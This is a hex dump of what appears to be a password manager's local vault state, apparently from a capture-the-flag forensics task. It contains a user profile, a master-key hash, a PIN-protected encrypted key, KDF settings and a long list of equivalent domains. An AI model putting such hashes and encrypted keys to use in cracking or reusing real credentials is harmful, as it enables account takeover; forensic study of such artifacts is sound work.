000010b0: 7145 2f52 617a 346f 4f67 6f3d 0000 0000  qE/Raz4oOgo=....
000010c0: 0000 0000 1300 ffff 0f00 0080 0400 ffff  ................
000010d0: 6372 7970 746f 4d61 7374 6572 4b65 7900  cryptoMasterKey.
000010e0: 0000 0000 0000 ffff 0900 0080 0400 ffff  ................
000010f0: 7075 626c 6963 4b65 7900 0000 0000 0000  publicKey.......
00001100: 0000 0000 0100 ffff 0000 0000 1300 ffff  ................
00001110: 0700 0080 0400 ffff 7072 6f66 696c 6500  ........profile.
00001120: 0000 0000 0800 ffff 0600 0080 0400 ffff  ................
00001130: 7573 6572 4964 0000 2400 0080 0400 ffff  userId..$.......
00001140: 3038 6233 3735 3162 2d61 6164 352d 3436  08b3751b-aad5-46
00001150: 3136 2d62 3166 372d 3031 3564 3362 6537  16-b1f7-015d3be7
00001160: 3439 6462 0000 0000 0400 0080 0400 ffff  49db............
00001170: 6e61 6d65 0000 0000 0b00 0080 0400 ffff  name............
00001180: 456c 7769 6e20 4a6f 6e65 7300 0000 0000  Elwin Jones.....
00001190: 0500 0080 0400 ffff 656d 6169 6c00 0000  ........email...
000011a0: 1900 0080 0400 ffff 656c 7769 6e2e 6a6f  ........elwin.jo
000011b0: 6e65 7340 636f 7270 6f72 6174 652e 6874  nes@corporate.ht
000011c0: 6200 0000 0000 0000 1400 0080 0400 ffff  b...............
000011d0: 6861 7350 7265 6d69 756d 5065 7273 6f6e  hasPremiumPerson
000011e0: 616c 6c79 0000 0000 0100 0000 0200 ffff  ally............
000011f0: 0d00 0080 0400 ffff 6b64 6649 7465 7261  ........kdfItera
00001200: 7469 6f6e 7300 0000 c027 0900 0300 ffff  tions....'......
00001210: 0900 0080 0400 ffff 6b64 664d 656d 6f72  ........kdfMemor
00001220: 7900 0000 0000 0000 0000 0000 0000 ffff  y...............
00001230: 0e00 0080 0400 ffff 6b64 6650 6172 616c  ........kdfParal
00001240: 6c65 6c69 736d 0000 0000 0000 0000 ffff  lelism..........
00001250: 0700 0080 0400 ffff 6b64 6654 7970 6500  ........kdfType.
00001260: 0000 0000 0300 ffff 0700 0080 0400 ffff  ................
00001270: 6b65 7948 6173 6800 2c00 0080 0400 ffff  keyHash.,.......
00001280: 3734 4537 316f 505a 4939 764e 6e6f 4553  74E71oPZI9vNnoES
00001290: 4e6b 754c 6c61 4454 6c6b 317a 412f 6348  NkuLlaDTlk1zA/cH
000012a0: 356c 3558 4e4f 4c4f 6334 773d 0000 0000  5l5XNOLOc4w=....
000012b0: 0d00 0080 0400 ffff 656d 6169 6c56 6572  ........emailVer
000012c0: 6966 6965 6400 0000 0100 0000 0200 ffff  ified...........
000012d0: 1000 0080 0400 ffff 7573 6573 4b65 7943  ........usesKeyC
000012e0: 6f6e 6e65 6374 6f72 0000 0000 0200 ffff  onnector........
000012f0: 1c00 0080 0400 ffff 636f 6e76 6572 7441  ........convertA
00001300: 6363 6f75 6e74 546f 4b65 7943 6f6e 6e65  ccountToKeyConne
00001310: 6374 6f72 0000 0000 0000 0000 0000 ffff  ctor............
00001320: 0800 0080 0400 ffff 6c61 7374 5379 6e63  ........lastSync
00001330: 1800 0080 0400 ffff 3230 3233 2d30 342d  ........2023-04-
00001340: 3133 5431 353a 3430 3a32 372e 3533 335a  13T15:40:27.533Z
00001350: 1a00 0080 0400 ffff 6861 7350 7265 6d69  ........hasPremi
00001360: 756d 4672 6f6d 4f72 6761 6e69 7a61 7469  umFromOrganizati
00001370: 6f6e 0000 0000 0000 0000 0000 0100 ffff  on..............
00001380: 0000 0000 1300 ffff 0800 0080 0400 ffff  ................
00001390: 7365 7474 696e 6773 0000 0000 0800 ffff  settings........
000013a0: 0f00 0080 0400 ffff 656e 7669 726f 6e6d  ........environm
000013b0: 656e 7455 726c 7300 0000 0000 0800 ffff  entUrls.........
000013c0: 0400 0080 0400 ffff 6261 7365 0000 0000  ........base....
000013d0: 3100 0080 0400 ffff 6874 7470 3a2f 2f70  1.......http://p
000013e0: 6173 7377 6f72 6474 6573 7469 6e67 7365  asswordtestingse
000013f0: 7276 6572 2d63 6f72 706f 7261 7465 2e6c  rver-corporate.l
00001400: 6f63 616c 3a38 3030 3000 0000 0000 0000  ocal:8000.......
00001410: 0300 0080 0400 ffff 6170 6900 0000 0000  ........api.....
00001420: 0000 0000 0000 ffff 0800 0080 0400 ffff  ................
00001430: 6964 656e 7469 7479 0000 0000 0000 ffff  identity........
00001440: 0500 0080 0400 ffff 6963 6f6e 7300 0000  ........icons...
00001450: 0000 0000 0000 ffff 0d00 0080 0400 ffff  ................
00001460: 6e6f 7469 6669 6361 7469 6f6e 7300 0000  notifications...
00001470: 0000 0000 0000 ffff 0600 0080 0400 ffff  ................
00001480: 6576 656e 7473 0000 0000 0000 0000 ffff  events..........
00001490: 0800 0080 0400 ffff 7765 6256 6175 6c74  ........webVault
000014a0: 0000 0000 0000 ffff 0c00 0080 0400 ffff  ................
000014b0: 6b65 7943 6f6e 6e65 6374 6f72 0000 0000  keyConnector....
000014c0: 0000 0000 0000 ffff 0000 0000 1300 ffff  ................
000014d0: 0c00 0080 0400 ffff 7069 6e50 726f 7465  ........pinProte
000014e0: 6374 6564 0000 0000 0000 0000 0800 ffff  cted............
000014f0: 0900 0080 0400 ffff 656e 6372 7970 7465  ........encrypte
00001500: 6400 0000 0000 0000 8800 0000 0400 ffff  d...............
00001510: 3200 2e00 4400 5800 4700 6400 5300 6100  2...D.X.G.d.S.a.
00001520: 4e00 3800 7400 4c00 7100 3500 7400 5300  N.8.t.L.q.5.t.S.
00001530: 5900 5800 3100 4a00 3000 5a00 4400 6700  Y.X.1.J.0.Z.D.g.
00001540: 3d00 3d00 7c00 3400 7500 5800 4c00 6d00  =.=.|.4.u.X.L.m.
00001550: 5200 4e00 7000 2f00 6400 4a00 6700 4500  R.N.p./.d.J.g.E.
00001560: 3400 3100 4d00 5900 5600 7800 7100 2b00  4.1.M.Y.V.x.q.+.
00001570: 6e00 7600 6400 6100 7500 6900 6e00 7500  n.v.d.a.u.i.n.u.
00001580: 3000 5900 4b00 3200 6500 4b00 6f00 4d00  0.Y.K.2.e.K.o.M.
00001590: 7600 4100 4500 6d00 7600 4a00 3800 4100  v.A.E.m.v.J.8.A.
000015a0: 4a00 3900 4400 6200 6500 7800 6500 7700  J.9.D.b.e.x.e.w.
000015b0: 7200 6700 6800 5800 7700 6c00 4200 7600  r.g.h.X.w.l.B.v.
000015c0: 3900 7000 5200 7c00 5500 6300 4200 7a00  9.p.R.|.U.c.B.z.
000015d0: 6900 5300 5900 7500 4300 6900 4a00 7000  i.S.Y.u.C.i.J.p.
000015e0: 7000 3500 4d00 4f00 5200 4200 6700 4800  p.5.M.O.R.B.g.H.
000015f0: 7600 5200 3200 6d00 5600 6700 7800 3300  v.R.2.m.V.g.x.3.
00001600: 6900 6c00 7000 5100 6800 4e00 7400 7a00  i.l.p.Q.h.N.t.z.
00001610: 4e00 4a00 4100 7a00 6600 3400 4d00 3d00  N.J.A.z.f.4.M.=.
00001620: 0000 0000 1300 ffff 1200 0080 0400 ffff  ................
00001630: 7661 756c 7454 696d 656f 7574 4163 7469  vaultTimeoutActi
00001640: 6f6e 0000 0000 0000 0400 0080 0400 ffff  on..............
00001650: 6c6f 636b 0000 0000 0c00 0080 0400 ffff  lock............
00001660: 7661 756c 7454 696d 656f 7574 0000 0000  vaultTimeout....
00001670: ffff ffff 0300 ffff 0c00 0080 0400 ffff  ................
00001680: 7072 6f74 6563 7465 6450 696e 0000 0000  protectedPin....
00001690: 0000 0000 0000 ffff 0800 0080 0400 ffff  ................
000016a0: 7365 7474 696e 6773 0000 0000 0800 ffff  settings........
000016b0: 1100 0080 0400 ffff 6571 7569 7661 6c65  ........equivale
000016c0: 6e74 446f 6d61 696e 7300 0000 0000 0000  ntDomains.......
000016d0: 5900 0000 0700 ffff 0000 0000 0300 ffff  Y...............
000016e0: 0200 0000 0700 ffff 0000 0000 0300 ffff  ................
000016f0: 0e00 0080 0400 ffff 616d 6572 6974 7261  ........ameritra
00001700: 6465 2e63 6f6d 0000 0100 0000 0300 ffff  de.com..........
00001710: 1000 0080 0400 ffff 7464 616d 6572 6974  ........tdamerit
00001720: 7261 6465 2e63 6f6d 0000 0000 1300 ffff  rade.com........
00001730: 0100 0000 0300 ffff 0400 0000 0700 ffff  ................
00001740: 0000 0000 0300 ffff 1100 0080 0400 ffff  ................
00001750: 6261 6e6b 6f66 616d 6572 6963 612e 636f  bankofamerica.co
00001760: 6d00 0000 0000 0000 0100 0000 0300 ffff  m...............
00001770: 0800 0080 0400 ffff 626f 6661 2e63 6f6d  ........bofa.com
00001780: 0200 0000 0300 ffff 0800 0080 0400 ffff  ................
00001790: 6d62 6e61 2e63 6f6d 0300 0000 0300 ffff  mbna.com........
000017a0: 0a00 0080 0400 ffff 7573 6563 666f 2e63  ........usecfo.c
000017b0: 6f6d 0000 0000 0000 0000 0000 1300 ffff  om..............
000017c0: 0200 0000 0300 ffff 0300 0000 0700 ffff  ................
000017d0: 0000 0000 0300 ffff 0a00 0080 0400 ffff  ................
000017e0: 7370 7269 6e74 2e63 6f6d 0000 0000 0000  sprint.com......
000017f0: 0100 0000 0300 ffff 0d00 0080 0400 ffff  ................
00001800: 7370 7269 6e74 7063 732e 636f 6d00 0000  sprintpcs.com...
00001810: 0200 0000 0300 ffff 0a00 0080 0400 ffff  ................
00001820: 6e65 7874 656c 2e63 6f6d 0000 0000 0000  nextel.com......
00001830: 0000 0000 1300 ffff 0300 0000 0300 ffff  ................
00001840: 0300 0000 0700 ffff 0000 0000 0300 ffff  ................
00001850: 0b00 0080 0400 ffff 796f 7574 7562 652e  ........youtube.
00001860: 636f 6d00 0000 0000 0100 0000 0300 ffff  com.............
00001870: 0a00 0080 0400 ffff 676f 6f67 6c65 2e63  ........google.c
00001880: 6f6d 0000 0000 0000 0200 0000 0300 ffff  om..............
00001890: 0900 0080 0400 ffff 676d 6169 6c2e 636f  ........gmail.co
000018a0: 6d00 0000 0000 0000 0000 0000 1300 ffff  m...............
000018b0: 0400 0000 0300 ffff 0200 0000 0700 ffff  ................
000018c0: 0000 0000 0300 ffff 0900 0080 0400 ffff  ................
000018d0: 6170 706c 652e 636f 6d00 0000 0000 0000  apple.com.......
000018e0: 0100 0000 0300 ffff 0a00 0080 0400 ffff  ................
000018f0: 6963 6c6f 7564 2e63 6f6d 0000 0000 0000  icloud.com......
00001900: 0000 0000 1300 ffff 0500 0000 0300 ffff  ................
00001910: 0300 0000 0700 ffff 0000 0000 0300 ffff  ................
00001920: 0e00 0080 0400 ffff 7765 6c6c 7366 6172  ........wellsfar
00001930: 676f 2e63 6f6d 0000 0100 0000 0300 ffff  go.com..........
00001940: 0600 0080 0400 ffff 7766 2e63 6f6d 0000  ........wf.com..
00001950: 0200 0000 0300 ffff 1600 0080 0400 ffff  ................
00001960: 7765 6c6c 7366 6172 676f 6164 7669 736f  wellsfargoadviso
00001970: 7273 2e63 6f6d 0000 0000 0000 1300 ffff  rs.com..........
00001980: 0600 0000 0300 ffff 0300 0000 0700 ffff  ................
00001990: 0000 0000 0300 ffff 0d00 0080 0400 ffff  ................
000019a0: 6d79 6d65 7272 696c 6c2e 636f 6d00 0000  mymerrill.com...
000019b0: 0100 0000 0300 ffff 0600 0080 0400 ffff  ................
000019c0: 6d6c 2e63 6f6d 0000 0200 0000 0300 ffff  ml.com..........
000019d0: 0f00 0080 0400 ffff 6d65 7272 696c 6c65  ........merrille
000019e0: 6467 652e 636f 6d00 0000 0000 1300 ffff  dge.com.........
000019f0: 0700 0000 0300 ffff 0500 0000 0700 ffff  ................
00001a00: 0000 0000 0300 ffff 1100 0080 0400 ffff  ................
00001a10: 6163 636f 756e 746f 6e6c 696e 652e 636f  accountonline.co
00001a20: 6d00 0000 0000 0000 0100 0000 0300 ffff  m...............
00001a30: 0800 0080 0400 ffff 6369 7469 2e63 6f6d  ........citi.com
00001a40: 0200 0000 0300 ffff 0c00 0080 0400 ffff  ................
00001a50: 6369 7469 6261 6e6b 2e63 6f6d 0000 0000  citibank.com....
00001a60: 0300 0000 0300 ffff 0d00 0080 0400 ffff  ................
00001a70: 6369 7469 6361 7264 732e 636f 6d00 0000  citicards.com...
00001a80: 0400 0000 0300 ffff 1200 0080 0400 ffff  ................
00001a90: 6369 7469 6261 6e6b 6f6e 6c69 6e65 2e63  citibankonline.c
00001aa0: 6f6d 0000 0000 0000 0000 0000 1300 ffff  om..............
00001ab0: 0800 0000 0300 ffff 0700 0000 0700 ffff  ................
00001ac0: 0000 0000 0300 ffff 0800 0080 0400 ffff  ................
00001ad0: 636e 6574 2e63 6f6d 0100 0000 0300 ffff  cnet.com........
00001ae0: 0a00 0080 0400 ffff 636e 6574 7476 2e63  ........cnettv.c
00001af0: 6f6d 0000 0000 0000 0200 0000 0300 ffff  om..............
00001b00: 0700 0080 0400 ffff 636f 6d2e 636f 6d00  ........com.com.
00001b10: 0300 0000 0300 ffff 0c00 0080 0400 ffff  ................
00001b20: 646f 776e 6c6f 6164 2e63 6f6d 0000 0000  download.com....
00001b30: 0400 0000 0300 ffff 0800 0080 0400 ffff  ................
00001b40: 6e65 7773 2e63 6f6d 0500 0000 0300 ffff  news.com........
00001b50: 0a00 0080 0400 ffff 7365 6172 6368 2e63  ........search.c
00001b60: 6f6d 0000 0000 0000 0600 0000 0300 ffff  om..............
00001b70: 0a00 0080 0400 ffff 7570 6c6f 6164 2e63  ........upload.c
00001b80: 6f6d 0000 0000 0000 0000 0000 1300 ffff  om..............
00001b90: 0900 0000 0300 ffff 0400 0000 0700 ffff  ................
00001ba0: 0000 0000 0300 ffff 1200 0080 0400 ffff  ................
00001bb0: 6261 6e61 6e61 7265 7075 626c 6963 2e63  bananarepublic.c
00001bc0: 6f6d 0000 0000 0000 0100 0000 0300 ffff  om..............
00001bd0: 0700 0080 0400 ffff 6761 702e 636f 6d00  ........gap.com.
00001be0: 0200 0000 0300 ffff 0b00 0080 0400 ffff  ................
00001bf0: 6f6c 646e 6176 792e 636f 6d00 0000 0000  oldnavy.com.....
00001c00: 0300 0000 0300 ffff 0d00 0080 0400 ffff  ................
00001c10: 7069 7065 726c 696d 652e 636f 6d00 0000  piperlime.com...
00001c20: 0000 0000 1300 ffff 0a00 0000 0300 ffff  ................
00001c30: 0e00 0000 0700 ffff 0000 0000 0300 ffff  ................
00001c40: 0800 0080 0400 ffff 6269 6e67 2e63 6f6d  ........bing.com
00001c50: 0100 0000 0300 ffff 0b00 0080 0400 ffff  ................
00001c60: 686f 746d 6169 6c2e 636f 6d00 0000 0000  hotmail.com.....
00001c70: 0200 0000 0300 ffff 0800 0080 0400 ffff  ................
00001c80: 6c69 7665 2e63 6f6d 0300 0000 0300 ffff  live.com........
00001c90: 0d00 0080 0400 ffff 6d69 6372 6f73 6f66  ........microsof
00001ca0: 742e 636f 6d00 0000 0400 0000 0300 ffff  t.com...........
00001cb0: 0700 0080 0400 ffff 6d73 6e2e 636f 6d00  ........msn.com.
00001cc0: 0500 0000 0300 ffff 0c00 0080 0400 ffff  ................
00001cd0: 7061 7373 706f 7274 2e6e 6574 0000 0000  passport.net....
00001ce0: 0600 0000 0300 ffff 0b00 0080 0400 ffff  ................
00001cf0: 7769 6e64 6f77 732e 636f 6d00 0000 0000  windows.com.....
00001d00: 0700 0000 0300 ffff 1300 0080 0400 ffff  ................
00001d10: 6d69 6372 6f73 6f66 746f 6e6c 696e 652e  microsoftonline.
00001d20: 636f 6d00 0000 0000 0800 0000 0300 ffff  com.............
00001d30: 0a00 0080 0400 ffff 6f66 6669 6365 2e63  ........office.c
00001d40: 6f6d 0000 0000 0000 0900 0000 0300 ffff  om..............
00001d50: 0d00 0080 0400 ffff 6f66 6669 6365 3336  ........office36
00001d60: 352e 636f 6d00 0000 0a00 0000 0300 ffff  5.com...........
00001d70: 1200 0080 0400 ffff 6d69 6372 6f73 6f66  ........microsof
00001d80: 7473 746f 7265 2e63 6f6d 0000 0000 0000  tstore.com......
00001d90: 0b00 0000 0300 ffff 0800 0080 0400 ffff  ................
00001da0: 7862 6f78 2e63 6f6d 0c00 0000 0300 ffff  xbox.com........
00001db0: 0900 0080 0400 ffff 617a 7572 652e 636f  ........azure.co
00001dc0: 6d00 0000 0000 0000 0d00 0000 0300 ffff  m...............
00001dd0: 1000 0080 0400 ffff 7769 6e64 6f77 7361  ........windowsa
00001de0: 7a75 7265 2e63 6f6d 0000 0000 1300 ffff  zure.com........
00001df0: 0b00 0000 0300 ffff 0400 0000 0700 ffff  ................
00001e00: 0000 0000 0300 ffff 0900 0080 0400 ffff  ................
00001e10: 7561 3267 6f2e 636f 6d00 0000 0000 0000  ua2go.com.......
00001e20: 0100 0000 0300 ffff 0700 0080 0400 ffff  ................
00001e30: 7561 6c2e 636f 6d00 0200 0000 0300 ffff  ual.com.........
00001e40: 0a00 0080 0400 ffff 756e 6974 6564 2e63  ........united.c
00001e50: 6f6d 0000 0000 0000 0300 0000 0300 ffff  om..............
00001e60: 0e00 0080 0400 ffff 756e 6974 6564 7769  ........unitedwi
00001e70: 6669 2e63 6f6d 0000 0000 0000 1300 ffff  fi.com..........
00001e80: 0c00 0000 0300 ffff 0200 0000 0700 ffff  ................
00001e90: 0000 0000 0300 ffff 0c00 0080 0400 ffff  ................
00001ea0: 6f76 6572 7475 7265 2e63 6f6d 0000 0000  overture.com....
00001eb0: 0100 0000 0300 ffff 0900 0080 0400 ffff  ................
00001ec0: 7961 686f 6f2e 636f 6d00 0000 0000 0000  yahoo.com.......
00001ed0: 0000 0000 1300 ffff 0d00 0000 0300 ffff  ................
00001ee0: 0200 0000 0700 ffff 0000 0000 0300 ffff  ................
00001ef0: 0d00 0080 0400 ffff 7a6f 6e65 616c 6172  ........zonealar
00001f00: 6d2e 636f 6d00 0000 0100 0000 0300 ffff  m.com...........
00001f10: 0c00 0080 0400 ffff 7a6f 6e65 6c61 6273  ........zonelabs
00001f20: 2e63 6f6d 0000 0000 0000 0000 1300 ffff  .com............
00001f30: 0e00 0000 0300 ffff 0200 0000 0700 ffff  ................
00001f40: 0000 0000 0300 ffff 0a00 0080 0400 ffff  ................
00001f50: 7061 7970 616c 2e63 6f6d 0000 0000 0000  paypal.com......
00001f60: 0100 0000 0300 ffff 1100 0080 0400 ffff  ................
00001f70: 7061 7970 616c 2d73 6561 7263 682e 636f  paypal-search.co
00001f80: 6d00 0000 0000 0000 0000 0000 1300 ffff  m...............
00001f90: 0f00 0000 0300 ffff 0200 0000 0700 ffff  ................
00001fa0: 0000 0000 0300 ffff 0800 0080 0400 ffff  ................
00001fb0: 6176 6f6e 2e63 6f6d 0100 0000 0300 ffff  avon.com........
00001fc0: 0c00 0080 0400 ffff 796f 7572 6176 6f6e  ........youravon
00001fd0: 2e63 6f6d 0000 0000 0000 0000 1300 ffff  .com............
00001fe0: 1000 0000 0300 ffff 0b00 0000 0700 ffff  ................
00001ff0: 0000 0000 0300 ffff 0b00 0080 0400 ffff  ................
00002000: 6469 6170 6572 732e 636f 6d00 0000 0000  diapers.com.....
00002010: 0100 0000 0300 ffff 0800 0080 0400 ffff  ................
00002020: 736f 6170 2e63 6f6d 0200 0000 0300 ffff  soap.com........
00002030: 0700 0080 0400 ffff 7761 672e 636f 6d00  ........wag.com.
00002040: 0300 0000 0300 ffff 0800 0080 0400 ffff  ................
00002050: 796f 796f 2e63 6f6d 0400 0000 0300 ffff  yoyo.com........
00002060: 0d00 0080 0400 ffff 6265 6175 7479 6261  ........beautyba
00002070: 722e 636f 6d00 0000 0500 0000 0300 ffff  r.com...........
00002080: 0800 0080 0400 ffff 6361 7361 2e63 6f6d  ........casa.com
00002090: 0600 0000 0300 ffff 0f00 0080 0400 ffff  ................
000020a0: 6166 7465 7273 6368 6f6f 6c2e 636f 6d00  afterschool.com.
000020b0: 0700 0000 0300 ffff 0800 0080 0400 ffff  ................
000020c0: 7669 6e65 2e63 6f6d 0800 0000 0300 ffff  vine.com........
000020d0: 0c00 0080 0400 ffff 626f 6f6b 776f 726d  ........bookworm
000020e0: 2e63 6f6d 0000 0000 0900 0000 0300 ffff  .com............
000020f0: 0800 0080 0400 ffff 6c6f 6f6b 2e63 6f6d  ........look.com
00002100: 0a00 0000 0300 ffff 0e00 0080 0400 ffff  ................
00002110: 7669 6e65 6d61 726b 6574 2e63 6f6d 0000  vinemarket.com..
00002120: 0000 0000 1300 ffff 1100 0000 0300 ffff  ................
00002130: 0200 0000 0700 ffff 0000 0000 0300 ffff  ................
00002140: 1000 0080 0400 ffff 3138 3030 636f 6e74  ........1800cont
00002150: 6163 7473 2e63 6f6d 0100 0000 0300 ffff  acts.com........
00002160: 0f00 0080 0400 ffff 3830 3063 6f6e 7461  ........800conta
00002170: 6374 732e 636f 6d00 0000 0000 1300 ffff  cts.com.........
00002180: 1200 0000 0300 ffff 1300 0000 0700 ffff  ................
00002190: 0000 0000 0300 ffff 0a00 0080 0400 ffff  ................
000021a0: 616d 617a 6f6e 2e63 6f6d 0000 0000 0000  amazon.com......
000021b0: 0100 0000 0300 ffff 0d00 0080 0400 ffff  ................
000021c0: 616d 617a 6f6e 2e63 6f6d 2e62 6500 0000  amazon.com.be...
000021d0: 0200 0000 0300 ffff 0900 0080 0400 ffff  ................
000021e0: 616d 617a 6f6e 2e61 6500 0000 0000 0000  amazon.ae.......
000021f0: 0300 0000 0300 ffff 0900 0080 0400 ffff  ................
00002200: 616d 617a 6f6e 2e63 6100 0000 0000 0000  amazon.ca.......
00002210: 0400 0000 0300 ffff 0c00 0080 0400 ffff  ................
00002220: 616d 617a 6f6e 2e63 6f2e 756b 0000 0000  amazon.co.uk....
00002230: 0500 0000 0300 ffff 0d00 0080 0400 ffff  ................
00002240: 616d 617a 6f6e 2e63 6f6d 2e61 7500 0000  amazon.com.au...
00002250: 0600 0000 0300 ffff 0d00 0080 0400 ffff  ................
00002260: 616d 617a 6f6e 2e63 6f6d 2e62 7200 0000  amazon.com.br...
00002270: 0700 0000 0300 ffff 0d00 0080 0400 ffff  ................
00002280: 616d 617a 6f6e 2e63 6f6d 2e6d 7800 0000  amazon.com.mx...
00002290: 0800 0000 0300 ffff 0d00 0080 0400 ffff  ................
000022a0: 616d 617a 6f6e 2e63 6f6d 2e74 7200 0000  amazon.com.tr...
000022b0: 0900 0000 0300 ffff 0900 0080 0400 ffff  ................
000022c0: 616d 617a 6f6e 2e64 6500 0000 0000 0000  amazon.de.......
000022d0: 0a00 0000 0300 ffff 0900 0080 0400 ffff  ................
000022e0: 616d 617a 6f6e 2e65 7300 0000 0000 0000  amazon.es.......
000022f0: 0b00 0000 0300 ffff 0900 0080 0400 ffff  ................
00002300: 616d 617a 6f6e 2e66 7200 0000 0000 0000  amazon.fr.......
00002310: 0c00 0000 0300 ffff 0900 0080 0400 ffff  ................
00002320: 616d 617a 6f6e 2e69 6e00 0000 0000 0000  amazon.in.......
00002330: 0d00 0000 0300 ffff 0900 0080 0400 ffff  ................
00002340: 616d 617a 6f6e 2e69 7400 0000 0000 0000  amazon.it.......
00002350: 0e00 0000 0300 ffff 0900 0080 0400 ffff  ................
00002360: 616d 617a 6f6e 2e6e 6c00 0000 0000 0000  amazon.nl.......
00002370: 0f00 0000 0300 ffff 0900 0080 0400 ffff  ................
00002380: 616d 617a 6f6e 2e70 6c00 0000 0000 0000  amazon.pl.......
00002390: 1000 0000 0300 ffff 0900 0080 0400 ffff  ................
000023a0: 616d 617a 6f6e 2e73 6100 0000 0000 0000  amazon.sa.......
000023b0: 1100 0000 0300 ffff 0900 0080 0400 ffff  ................
000023c0: 616d 617a 6f6e 2e73 6500 0000 0000 0000  amazon.se.......
000023d0: 1200 0000 0300 ffff 0900 0080 0400 ffff  ................
000023e0: 616d 617a 6f6e 2e73 6700 0000 0000 0000  amazon.sg.......
000023f0: 0000 0000 1300 ffff 1300 0000 0300 ffff  ................
00002400: 0300 0000 0700 ffff 0000 0000 0300 ffff  ................
00002410: 0700 0080 0400 ffff 636f 782e 636f 6d00  ........cox.com.
00002420: 0100 0000 0300 ffff 0700 0080 0400 ffff  ................
00002430: 636f 782e 6e65 7400 0200 0000 0300 ffff  cox.net.........
00002440: 0f00 0080 0400 ffff 636f 7862 7573 696e  ........coxbusin
00002450: 6573 732e 636f 6d00 0000 0000 1300 ffff  ess.com.........
00002460: 1400 0000 0300 ffff 0200 0000 0700 ffff  ................
00002470: 0000 0000 0300 ffff 1300 0080 0400 ffff  ................
00002480: 6d79 6e6f 7274 6f6e 6163 636f 756e 742e  mynortonaccount.
00002490: 636f 6d00 0000 0000 0100 0000 0300 ffff  com.............
000024a0: 0a00 0080 0400 ffff 6e6f 7274 6f6e 2e63  ........norton.c
000024b0: 6f6d 0000 0000 0000 0000 0000 1300 ffff  om..............
000024c0: 1500 0000 0300 ffff 0200 0000 0700 ffff  ................
000024d0: 0000 0000 0300 ffff 0b00 0080 0400 ffff  ................
000024e0: 7665 7269 7a6f 6e2e 636f 6d00 0000 0000  verizon.com.....
000024f0: 0100 0000 0300 ffff 0b00 0080 0400 ffff  ................
00002500: 7665 7269 7a6f 6e2e 6e65 7400 0000 0000  verizon.net.....
00002510: 0000 0000 1300 ffff 1600 0000 0300 ffff  ................
00002520: 0200 0000 0700 ffff 0000 0000 0300 ffff  ................
00002530: 0b00 0080 0400 ffff 7261 6b75 7465 6e2e  ........rakuten.
00002540: 636f 6d00 0000 0000 0100 0000 0300 ffff  com.............
00002550: 0700 0080 0400 ffff 6275 792e 636f 6d00  ........buy.com.
00002560: 0000 0000 1300 ffff 1700 0000 0300 ffff  ................
00002570: 0200 0000 0700 ffff 0000 0000 0300 ffff  ................
00002580: 0c00 0080 0400 ffff 7369 7269 7573 786d  ........siriusxm
00002590: 2e63 6f6d 0000 0000 0100 0000 0300 ffff  .com............
000025a0: 0a00 0080 0400 ffff 7369 7269 7573 2e63  ........sirius.c
000025b0: 6f6d 0000 0000 0000 0000 0000 1300 ffff  om..............
000025c0: 1800 0000 0300 ffff 0400 0000 0700 ffff  ................
000025d0: 0000 0000 0300 ffff 0600 0080 0400 ffff  ................
000025e0: 6561 2e63 6f6d 0000 0100 0000 0300 ffff  ea.com..........
000025f0: 0a00 0080 0400 ffff 6f72 6967 696e 2e63  ........origin.c
00002600: 6f6d 0000 0000 0000 0200 0000 0300 ffff  om..............
00002610: 0d00 0080 0400 ffff 706c 6179 3466 7265  ........play4fre
00002620: 652e 636f 6d00 0000 0300 0000 0300 ffff  e.com...........
00002630: 1400 0080 0400 ffff 7469 6265 7269 756d  ........tiberium
00002640: 616c 6c69 616e 6365 2e63 6f6d 0000 0000  alliance.com....
00002650: 0000 0000 1300 ffff 1900 0000 0300 ffff  ................
00002660: 0400 0000 0700 ffff 0000 0000 0300 ffff  ................
00002670: 0d00 0080 0400 ffff 3337 7369 676e 616c  ........37signal
00002680: 732e 636f 6d00 0000 0100 0000 0300 ffff  s.com...........
00002690: 0c00 0080 0400 ffff 6261 7365 6361 6d70  ........basecamp
000026a0: 2e63 6f6d 0000 0000 0200 0000 0300 ffff  .com............
000026b0: 0e00 0080 0400 ffff 6261 7365 6361 6d70  ........basecamp
000026c0: 6871 2e63 6f6d 0000 0300 0000 0300 ffff  hq.com..........
000026d0: 0e00 0080 0400 ffff 6869 6768 7269 7365  ........highrise
000026e0: 6871 2e63 6f6d 0000 0000 0000 1300 ffff  hq.com..........
000026f0: 1a00 0000 0300 ffff 0300 0000 0700 ffff  ................
00002700: 0000 0000 0300 ffff 1000 0080 0400 ffff  ................
00002710: 7374 6561 6d70 6f77 6572 6564 2e63 6f6d  steampowered.com
00002720: 0100 0000 0300 ffff 1200 0080 0400 ffff  ................
00002730: 7374 6561 6d63 6f6d 6d75 6e69 7479 2e63  steamcommunity.c
00002740: 6f6d 0000 0000 0000 0200 0000 0300 ffff  om..............
00002750: 0e00 0080 0400 ffff 7374 6561 6d67 616d  ........steamgam
00002760: 6573 2e63 6f6d 0000 0000 0000 1300 ffff  es.com..........
00002770: 1b00 0000 0300 ffff 0200 0000 0700 ffff  ................
00002780: 0000 0000 0300 ffff 0800 0080 0400 ffff  ................
00002790: 6368 6172 742e 696f 0100 0000 0300 ffff  chart.io........
000027a0: 0b00 0080 0400 ffff 6368 6172 7469 6f2e  ........chartio.
000027b0: 636f 6d00 0000 0000 0000 0000 1300 ffff  com.............
000027c0: 1c00 0000 0300 ffff 0200 0000 0700 ffff  ................
000027d0: 0000 0000 0300 ffff 0f00 0080 0400 ffff  ................
000027e0: 676f 746f 6d65 6574 696e 672e 636f 6d00  gotomeeting.com.
000027f0: 0100 0000 0300 ffff 1000 0080 0400 ffff  ................
00002800: 6369 7472 6978 6f6e 6c69 6e65 2e63 6f6d  citrixonline.com
00002810: 0000 0000 1300 ffff 1d00 0000 0300 ffff  ................
00002820: 0200 0000 0700 ffff 0000 0000 0300 ffff  ................
00002830: 0b00 0080 0400 ffff 676f 676f 6169 722e  ........gogoair.
00002840: 636f 6d00 0000 0000 0100 0000 0300 ffff  com.............
00002850: 1000 0080 0400 ffff 676f 676f 696e 666c  ........gogoinfl
00002860: 6967 6874 2e63 6f6d 0000 0000 1300 ffff  ight.com........
00002870: 1e00 0000 0300 ffff 0200 0000 0700 ffff  ................
00002880: 0000 0000 0300 ffff 0900 0080 0400 ffff  ................
00002890: 6d79 7371 6c2e 636f 6d00 0000 0000 0000  mysql.com.......
000028a0: 0100 0000 0300 ffff 0a00 0080 0400 ffff  ................
000028b0: 6f72 6163 6c65 2e63 6f6d 0000 0000 0000  oracle.com......
000028c0: 0000 0000 1300 ffff 1f00 0000 0300 ffff  ................
000028d0: 0200 0000 0700 ffff 0000 0000 0300 ffff  ................
000028e0: 0c00 0080 0400 ffff 6469 7363 6f76 6572  ........discover
